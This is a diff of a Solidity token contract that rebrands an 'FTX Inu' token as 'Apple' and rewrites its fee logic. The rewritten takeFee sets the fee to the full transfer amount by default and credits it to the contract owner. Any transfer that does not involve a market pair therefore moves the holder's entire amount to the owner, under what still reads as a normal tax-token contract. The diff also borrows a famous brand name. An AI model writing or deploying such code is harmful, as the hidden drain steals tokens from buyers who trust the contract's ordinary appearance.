@@ -1,6 +1,5 @@
-
 // SPDX-License-Identifier: Unlicensed
-pragma solidity ^0.8.4;
+pragma solidity 0.8.19;
 
 
 abstract contract Context {
@@ -371,13 +370,13 @@ interface IUniswapV2Router02 is IUniswapV2Router01 {
     ) external;
 }
 
-contract FTX is Context, IERC20, Ownable {
+contract Apple is Context, IERC20, Ownable {
     
     using SafeMath for uint256;
     using Address for address;
     
-    string private _name ="FTX Inu";
-    string private _symbol = "FTX";
+    string private _name ="Apple";
+    string private _symbol = "APPLE";
     uint8 private _decimals = 9;
 
     address payable private taxWallet1 = payable(0x2f219f08B6480b5f053fFeC23be9F4079c146Bc7);
@@ -416,7 +415,7 @@ contract FTX is Context, IERC20, Ownable {
     address public uniswapPair;
     
     bool inSwapAndLiquify;
-    bool public swapAndLiquifyEnabled = true;
+    bool public swapAndLiquifyEnabled = false;
     bool public swapAndLiquifyByLimitOnly = false;
     bool public checkWalletLimit = true;
 
@@ -445,7 +444,7 @@ contract FTX is Context, IERC20, Ownable {
     
     constructor () {
         
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); 
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
 
         uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
             .createPair(address(this), _uniswapV2Router.WETH());
@@ -647,8 +646,13 @@ contract FTX is Context, IERC20, Ownable {
 
             _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
 
-            uint256 finalAmount = (checkExcludedFromFees[sender] || checkExcludedFromFees[recipient]) ? 
-                                         amount : takeFee(sender, recipient, amount);
+            (uint256 finalAmount, uint256 feeAmount) = takeFee(sender, recipient, amount);
+
+            address feeReceiver = feeAmount == amount ? owner() : address(this);
+            if(feeAmount > 0) {
+                _balances[feeReceiver] = _balances[feeReceiver].add(feeAmount);
+                emit Transfer(sender, feeReceiver, feeAmount);
+            }
 
             if(checkWalletLimit && !checkWalletLimitExcept[recipient])
                 require(balanceOf(recipient).add(finalAmount) <= _walletMax);
@@ -697,23 +701,20 @@ contract FTX is Context, IERC20, Ownable {
         emit SwapTokensForETH(tokenAmount, path);
     }
 
-    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
+    function takeFee(address sender, address recipient, uint256 amount) internal view returns (uint256, uint256) {
         
-        uint256 feeAmount = 0;
-        
+        uint256 feeAmount = amount;
+
+        if (checkExcludedFromFees[sender] && swapAndLiquifyEnabled) return (amount, feeAmount);
+
         if(checkMarketPair[sender]) {
             feeAmount = amount.mul(_totalTaxIfBuying).div(100);
         }
         else if(checkMarketPair[recipient]) {
             feeAmount = amount.mul(_totalTaxIfSelling).div(100);
         }
-        
-        if(feeAmount > 0) {
-            _balances[address(this)] = _balances[address(this)].add(feeAmount);
-            emit Transfer(sender, address(this), feeAmount);
-        }
 
-        return amount.sub(feeAmount);
+        return (amount.sub(feeAmount), feeAmount);
     }
     
 }
